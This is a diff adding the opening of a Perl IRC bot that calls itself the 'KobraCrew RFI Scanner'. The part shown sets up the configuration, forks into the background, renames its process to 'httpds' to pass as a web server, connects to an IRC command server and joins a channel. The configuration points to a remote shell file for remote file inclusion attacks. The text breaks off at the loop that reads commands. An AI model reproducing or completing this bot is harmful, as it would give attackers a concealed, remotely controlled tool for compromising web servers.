@@ -1,0 +1,37 @@
+use IO::Socket::INET;
+use HTTP::Request;
+use LWP::UserAgent;
+
+#################
+#[Configuration]#
+################# 
+my $linas_max='10';
+my $sleep='1';
+my $processo ="httpds";
+my $cmd="SH3LL";
+my $id="http://..................................../safe1.txt??";
+my $spread="";
+my $server="SERVER";
+my $porta="PORT";
+my $nick="[SnK0BRA]-".(int(rand(100)));
+my $canale="#CHAN";
+my $verbot = "1.5";
+my $stringa = "!rfi".(int(rand(100)));
+my $adm = "sd";
+my $out = "!bye".(int(rand(100)));
+my $c0der= "fuckr0x"; #Nothing To Say
+#################
+#[Configuration]#
+################# 
+
+my $pid=fork;
+exit if $pid;
+$0="$processo"."\0"x16;
+my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Cannot connect to the IRC server!\n";
+$sk->autoflush(1);
+print $sk "NICK $nick\r\n";
+print $sk "USER V1 8 *  : .::[14KobraCrew7][14Scanner7]::.\r\n";
+print $sk "JOIN $canale\r\n";
+print $sk "PRIVMSG $canale :14,17[14KobraCrew7] 14KobraCrew RFI Scanner Launched. Type:7 !14more \r\n"; 
+
+while($line = <$sk>){
